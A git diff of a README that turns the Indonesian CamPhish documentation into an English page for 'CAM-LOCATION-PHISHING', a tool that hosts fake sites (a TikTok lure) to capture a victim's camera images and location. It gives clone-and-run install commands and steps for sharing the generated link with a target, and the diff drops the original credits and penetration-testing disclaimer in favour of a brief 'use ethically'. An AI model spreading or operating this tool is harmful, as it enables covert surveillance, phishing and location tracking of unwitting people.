@@ -1,70 +1,58 @@
-# CamPhish
-Ambil gambar dari kamera depan ponsel atau webcam PC target hanya dengan mengirimkan sebuah tautan.
-![CamPhish](https://raw.githubusercontent.com/wanzxploit/CamPhish/refs/heads/master/logo.png)
+# CAM-LOCATION-PHISHING
+Capture images from a victim’s PC or mobile camera
 
-# Apa itu CamPhish?
-CamPhish adalah alat yang digunakan untuk mengambil gambar dari kamera depan ponsel atau webcam PC target. Alat ini meng-host situs web palsu menggunakan server PHP bawaan dan menggunakan Savero untuk menghasilkan tautan yang dapat diteruskan ke target melalui internet. Situs web tersebut meminta izin kamera, dan jika target mengizinkannya, alat ini akan mengambil gambar dari perangkat target.
+![CAM-LOCATION-PHISHING](https://raw.githubusercontent.com/whitehackergeo/PROGRAMING-CODE-PROJECT/refs/heads/main/CAM-LOCATION-PISHING/Screenshot%202026-04-29%20203329.png)
 
-## Fitur
-- Dua template halaman otomatis untuk membuat target tetap terlibat di situs web:
-  - Festival Wishing
-  - Live YouTube TV
-  - Online Meeting [Beta]
-- Cukup masukkan nama festival atau ID video YouTube.
+# What is Cam-location-phishing
 
-## Sistem yang Telah Diuji:
+Cam-location-phishing is a tool designed to capture images from a target’s device camera and retrieve location data.
+
+## SITE AVAILABLE NOW
+- Target Website:
+  - [BEST] TikTok
+
+## SYSTEMS SUPPORTED
 - Kali Linux
 - Termux
-- MacOS
+- macOS
 - Ubuntu
-- Parrot Sec OS
+- Parrot Security OS
 
-# Persyaratan dan Instalasi
-Alat ini memerlukan PHP untuk server web dan Savero untuk menghasilkan tautan. Jalankan perintah berikut di terminal Anda:
+# Requirements and Installation
+This tool requires PHP for the web server and Savero to generate links. Run:
 
-```
 apt-get -y install php openssh git wget
-```
 
-## Instalasi (Kali Linux/Termux):
+## Installation (Kali Linux/Termux)
 
-```
-git clone https://github.com/wanzxploit/CamPhish
-cd CamPhish
-bash camphish.sh
-```
+git clone https://github.com/whitehackergeo/PROGRAMING-CODE-PROJECT
+cd PROGRAMING-CODE-PROJECT/CAM-LOCATION-PISHING
+chmod +x cam-location-phish.sh
+bash cam-location-phish.sh
 
+## Move captured images (internal download folder)
 
-## Pindahkan hasil gambar (Folfer download internal):
-
-```
 bash move.sh
-```
 
-## Cara Penggunaan
-1. Jalankan perintah instalasi di atas untuk mengunduh dan mengatur alat ini.
-2. Saat menjalankan `bash camphish.sh`, Anda akan diminta memilih server:
-   - **Opsi 1: Ngrok**
-   - **Opsi 2: Savero**
-3. Disarankan untuk memilih opsi 2 (Savero) karena lebih stabil dibandingkan Ngrok, terutama jika jaringan internet Anda tidak stabil.
-4. Gunakan alat ini dengan memilih template halaman yang diinginkan (Festival Wishing, Live YouTube TV, atau Online Meeting).
-5. Bagikan tautan yang dihasilkan kepada target Anda. Ingat untuk hanya menggunakan alat ini untuk keperluan etis.
+## How to Use
+1. Run the installation commands above.
+2. When running `bash cam-location-phish.sh`
+3. Savero is recommended (more stable).
+4. Select template ( SOON BE SO MUCH TEMPLATE )
+5. Share generated link with target (use ethically).
 
-## Catatan untuk Pengguna Android
-Jika mengalami masalah menggunakan Termux, disarankan untuk menggunakan **Linux Userland** sebagai alternatif. Aplikasi ini menyediakan lingkungan Linux lengkap untuk menjalankan alat seperti CamPhish dengan lebih lancar.
+## Note for Android Users
+If Termux has issues, use Linux Userland for a full Linux environment.
 
-## Perubahan Terbaru:
-- **Versi 1.7:**
-  - Perbaikan direktori home yang gagal di Termux.
-  - Dukungan untuk Apple Silicon (M1/M2/M3 ARM64).
-  - Dukungan untuk ARM64 seperti Raspberry Pi.
-- **Versi 1.6:** Perbaikan pembuatan tautan langsung Ngrok.
-- **Versi 1.5:** Penambahan template pertemuan daring baru.
-- **Versi 1.4:** Pembaruan token autentikasi Ngrok.
-- **Versi 1.3:** Perbaikan tautan langsung Ngrok.
+## Recent Changes
+- Version 1.7:
+  - Fixed Termux home directory issue
+  - Apple Silicon (M1/M2/M3 ARM64) support
+  - ARM64 (Raspberry Pi) support
+- Version 1.6: Fixed Ngrok direct link generation
+- Version 1.5: Added online meeting template
+- Version 1.4: Updated Ngrok auth token
+- Version 1.3: Fixed Ngrok links
 
-## Kredit
-CamPhish adalah proyek hasil *fork* dari [TechChipNet](https://github.com/techchipnet/CamPhish) dan terinspirasi oleh [TheLinuxChoice](https://github.com/thelinuxchoice/). Terima kasih kepada pengembang aslinya atas ide dan kontribusinya.
-
-**Peringatan:** CamPhish dibuat untuk membantu dalam pengujian penetrasi. Pengembang tidak bertanggung jawab atas penyalahgunaan atau penggunaan ilegal alat ini. Gunakan dengan bijak.
-
+## Credits
+BY WHITE HACKER GEO
